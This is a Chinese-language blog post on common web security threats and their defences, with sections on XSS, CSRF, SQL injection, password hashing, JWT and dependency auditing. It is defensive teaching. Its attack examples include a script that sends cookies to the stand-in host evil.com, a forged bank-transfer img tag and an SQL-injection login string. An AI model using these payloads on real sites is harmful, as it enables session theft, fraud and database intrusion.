---
layout: post
title: "Web 安全防护实践"
date: 2026-06-24
categories: [engineering, security]
tags: [security, xss, csrf, sql-injection, authentication]
---

## 常见 Web 安全威胁

Web 安全是每个开发者必须面对的课题。以下是最高频的安全威胁及防护方案。

## XSS（跨站脚本攻击）

攻击者注入恶意脚本到页面中，窃取用户数据。

### 攻击示例

```html
<!-- 攻击者在评论中注入 -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

### 防护方案

```javascript
// ❌ 直接拼接 HTML，危险
element.innerHTML = `<div>${userInput}</div>`

// ✅ 使用 textContent，自动转义
element.textContent = userInput

// ✅ 或使用模板引擎的自动转义
// React: 默认转义
<div>{userInput}</div>

// ✅ Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self'
```

## CSRF（跨站请求伪造）

攻击者诱导用户在已认证状态下执行非预期操作。

### 攻击示例

```html
<!-- 伪装的图片，实际是转账请求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
```

### 防护方案

```javascript
// ✅ CSRF Token
app.use((req, res, next) => {
  res.locals.csrfToken = crypto.randomBytes(32).toString('hex');
  next();
});

// 表单中嵌入 token
// <input type="hidden" name="_csrf" value="{{csrfToken}}">

// ✅ SameSite Cookie
app.use(session({
  cookie: { sameSite: 'strict' }
}));

// ✅ 检查 Referer / Origin 头
```

## SQL 注入

攻击者通过输入恶意 SQL 片段操纵数据库。

### 攻击示例

```sql
-- 输入: admin' OR '1'='1
SELECT * FROM users WHERE name = 'admin' OR '1'='1' AND password = '...'
-- 返回所有用户！
```

### 防护方案

```javascript
// ❌ 字符串拼接
const sql = `SELECT * FROM users WHERE name = '${name}'`

// ✅ 参数化查询
const result = await db.query(
  'SELECT * FROM users WHERE name = $1',
  [name]
)

// ✅ ORM 默认参数化
const user = await User.findOne({ where: { name } })
```

## 认证与授权

### 密码存储

```javascript
// ❌ 明文存储
users.push({ password: req.body.password })

// ❌ 简单哈希
crypto.createHash('md5').update(password).digest('hex')

// ✅ bcrypt 加盐哈希
const salt = await bcrypt.genSalt(12)
const hash = await bcrypt.hash(password, salt)

// ✅ 验证
const valid = await bcrypt.compare(inputPassword, storedHash)
```

### JWT 安全实践

```javascript
// ✅ 安全的 JWT 配置
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,        // 至少 256 位随机密钥
  {
    expiresIn: '15m',            // 短有效期
    algorithm: 'HS256'
  }
)

// ✅ Refresh Token 轮换
// Access Token: 15 分钟过期
// Refresh Token: 7 天过期，使用后立即换发新的
```

## 依赖安全

```bash
# 定期审计依赖漏洞
npm audit

# 自动修复
npm audit fix

# 使用 Snyk 等工具持续监控
npx snyk test
```

## 安全检查清单

- [ ] 所有用户输入都经过验证和转义
- [ ] 使用参数化查询，禁止拼接 SQL
- [ ] 密码使用 bcrypt 加盐存储
- [ ] Cookie 设置 HttpOnly + Secure + SameSite
- [ ] 敏感接口有权限校验
- [ ] HTTPS 全站启用
- [ ] 依赖定期审计漏洞
- [ ] 错误信息不暴露内部实现细节
- [ ] 速率限制防止暴力破解
- [ ] 日志中不记录敏感信息（密码、Token）

## 总结

安全不是一次性的工作，而是持续的过程。遵循最小权限原则、纵深防御策略，把安全检查融入 CI/CD 流水线，让安全成为开发流程的一部分，而非事后补救。